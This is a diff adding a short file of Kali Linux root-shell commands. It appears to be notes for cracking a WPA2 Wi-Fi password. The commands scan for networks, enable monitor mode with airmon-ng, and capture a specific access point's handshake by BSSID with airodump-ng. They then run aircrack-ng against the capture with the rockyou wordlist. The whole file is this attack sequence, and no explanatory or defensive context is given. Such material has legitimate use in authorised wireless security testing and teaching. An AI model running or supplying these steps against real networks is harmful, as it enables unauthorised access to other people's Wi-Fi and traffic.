@@ -1,0 +1,8 @@
+root@kali:~# iwconfig
+root@kali:~# iwlist wlan0 scanning
+root@kali:~# airmon-ng start wlan0
+root@kali:~# airmon-ng check kill
+root@kali:~# airmon-ng start wlan0
+root@kali:~# airodump-ng -w atheros -c 6 --bssid 14:F6:5A:F4:57:22 wlan0mon
+root@kali:~# ls -l
+root@kali:~# aircrack-ng -a 2 atheros-01.cap -w /usr/share/wordlists/rockyou.txt
